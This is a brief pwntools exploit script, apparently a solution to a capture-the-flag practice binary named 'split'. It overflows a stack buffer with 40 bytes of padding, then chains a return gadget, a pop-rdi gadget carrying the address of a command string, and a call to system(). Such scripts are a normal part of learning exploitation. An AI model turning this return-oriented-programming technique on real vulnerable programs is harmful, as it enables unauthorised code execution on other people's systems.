from pwn import *
context.log_level='debug'
binary = "./split"
p = process(binary)
elf = context.binary = ELF(binary)
rop = ROP(binary)

prompt = "> "
catflag = 0x0000000000601060 # use IDA strings, cant use gdb idk

p.sendlineafter(prompt, flat(
	"A"*40,
	rop.ret.address,
	rop.rdi.address, catflag,
	elf.symbols.system
))

flag = p.recvline()
#success(flag)

p.interactive()
